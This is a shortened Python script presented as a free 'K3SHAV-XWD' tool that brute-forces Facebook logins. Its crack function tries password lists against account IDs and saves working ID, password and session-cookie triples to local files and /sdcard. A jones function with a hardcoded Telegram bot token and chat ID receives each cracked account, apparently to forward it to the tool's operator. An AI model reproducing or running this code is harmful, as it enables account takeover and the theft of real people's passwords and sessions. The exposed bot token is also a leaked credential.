...
def jones(idf,pw,kuki):
    try:
        token = "6734360712:AAGDNduY3paQj7haX6YhkmD8xNsyzWTeJkw"
        chatid = "5850908645"
...
def back():
	login()
def contact():
	os.system('xdg-open https://www.facebook.com/GREENCRIMINDNDB/')
	back()
def linex():
...
#------------------[ LOGO-LAKNAT ]-----------------#
logo=("""\033[1;32m  	
  \033[1;32m____  _____      __________   
\033[1;32m \   \/  /  \    /  \______ \  
\033[1;37m \     /\   \/\/   /|    |  \ 
\033[1;37m /     \ \  <>      / |    `   \
\033[1;32m/___/\  \ \__/\  / /_______  /
 \033[\033 \_/      \/          \/ """)    

      
def info():         
    print("""\033[1;32m=====================\033[1;37m=====================
[•]DEVLOPER> : \033[1;37mK3SHAV-\033[1;32mXWD\033[1;37m
[•]AUTHOR>    : \033[1;37mK3SHAV-\033[1;32mDON\033[1;37m
[•] FACEBOOK>:\033[1;97m : \x1b[97m\033[37;41m XWD-BRAND\033[0;m
[•] VERSION>     : \033[1;36m 3.0 \033[1;37m
[•]\033[1;37mTOOL-/-\033[1;32mTYPE\033[1;37m >  \033[1;97m : \x1b[97m\033[37;41m FREE\033[0;m
\033[1;32m=====================\033[1;37m=====================""")
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r \u001b[37m[K3SHAV-XWD] {loop}/{len(id)} OK[{H}{ok}\u001b[37m] [{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
...
'bi_xrwh': 0
    ...
    'viewport-width': '980',}
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print(f'\r{P}{H} [XWD-OK] {H}{idf}|{pw}\n{P}[{H}COOKIE]{P}\033[1;31m{kuki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				open('/sdcard/K3SHAV-XWD-OK.txt', 'a').write( idf+' | '+pw+' | '+kuki+'\n')
				jones(idf,pw,kuki)
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}[{K}XWD-CP{P}] {K}{idf}|{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				open('/sdcard/K3SHAV-XWD-CP.txt', 'a').write( idf+' | '+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}{K} [{time.strftime("XWD")}-CP] {idf} │ {pw} {P}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}{H} [{time.strftime("XWD")}-OK] {idf} │ {pw} {P}')
				cek_apk(kuki)
